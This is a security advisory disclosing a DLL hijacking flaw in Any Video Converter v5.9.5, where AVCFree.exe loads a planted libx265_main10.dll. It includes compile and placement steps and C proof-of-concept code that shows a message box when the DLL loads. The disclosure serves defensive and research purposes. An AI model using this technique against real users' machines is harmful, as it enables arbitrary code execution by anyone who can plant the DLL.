Vendor:
===========================
www.any-video-converter.com



Product:
====================================
AVCSoft / Any Video Converter v5.9.5

AVCFree.exe is a Video downloader and converter.



Vulnerability Type:
====================
DLL Hijack



CVE Reference:
==============
N/A



Vulnerability Details:
=====================


Vuln DLL: libx265_main10.dll

AVCFree.exe will search for an load any DLL named "libx265_main10.dll". If an attacker can place the DLL in a location
where victim opens a file in AVCFree it will load and run the attackers DLL and code.

In testing I notice if the file type is associated with AVCFree.exe as default program to open with then double clicking
the file will load and execute the vuln DLL. If file type is not associated with AVCFree then right clicking and choosing
to open with AVCFree will do the same.

Right click or Double click and open in AVCFree.exe following file types then BOOM.

.mp4, .mp3, .mpg, mpeg, .iso, .divx, .wav, .flv, .avs, .mov

and probably more...



Exploit code(s):
===============

1) Save and compile below C code as 'libx265_main10.c' to create vuln DLL

2) Place on remote share or other directory like "downloads"

3) Right click or Double Click an .mpg file or any of extensions listed above to open with AVCFree.exe then BOOM!


#include<windows.h>

//gcc -c libx265_main10.c
//gcc -shared -o libx265_main10.dll libx265_main10.o

BOOL APIENTRY DllMain(HINSTANCE hInst, DWORD reason, LPVOID reserved){
  switch (reason) {
  case DLL_PROCESS_ATTACH:
    MessageBox(NULL, "Arbitrary Code Exec", "PWNED!", MB_OK);  
    break;
  }

return 0;
}
